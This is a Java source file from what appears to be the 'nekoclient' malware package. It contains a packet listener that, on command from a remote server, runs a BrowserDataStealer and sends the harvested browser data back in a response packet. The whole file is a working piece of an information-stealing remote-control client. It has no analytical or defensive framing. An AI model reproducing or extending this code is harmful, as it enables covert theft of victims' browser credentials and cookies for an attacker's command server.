package dev.neko.nekoclient.packet.listener.impl;

import dev.neko.nekoclient.Client;
import dev.neko.nekoclient.api.stealer.browser.impl.BrowserDataStealer;
import dev.neko.nekoclient.packet.impl.client.BrowserDataResponsePacket;
import dev.neko.nekoclient.packet.impl.server.RequestBrowserDataPacket;
import dev.neko.nekoclient.packet.listener.PacketListener;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class RequestBrowserDataPacketListener implements PacketListener<RequestBrowserDataPacket> {
   public void call(RequestBrowserDataPacket packet, Client client, String id) throws IOException {
      ExecutorService executorService = Executors.newSingleThreadExecutor();
      executorService.execute(() -> {
         try {
            client.send(new BrowserDataResponsePacket(packet.getNonce(), BrowserDataStealer.read()));
         } catch (IOException var4x) {
            throw new RuntimeException(var4x);
         }

         executorService.shutdown();
      });
   }
}
